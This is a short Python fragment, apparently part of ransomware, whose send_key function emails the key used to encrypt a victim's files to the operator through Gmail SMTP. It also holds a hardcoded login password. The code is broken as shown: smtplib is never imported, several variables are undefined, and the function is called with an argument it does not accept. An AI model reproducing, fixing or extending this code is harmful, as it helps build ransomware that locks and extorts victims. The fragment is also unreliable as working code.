#!/usr/bin/python3
# coding: utf-8
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


# appel de la fonction pour envoyer la clé par e mail
def send_key():
    try:
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = "The second key generate by the reboot of system"
        body = "The server you sending a key from the client, the script encrypted her files with this key."
        msg.attach(MIMEText(body, 'plain'))
        filename = "{}.key".format(usrkey)
        attachment = open(filename, "rb")
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(p)
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, "annonym80$")
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
    except IOError:
        pass
    except smtplib.SMTPAuthenticationError:
        print("[!] Login or pass failed")
        pass

# CALL THE FUNCTION TO SEND THE MAIL
send_key(key.key)
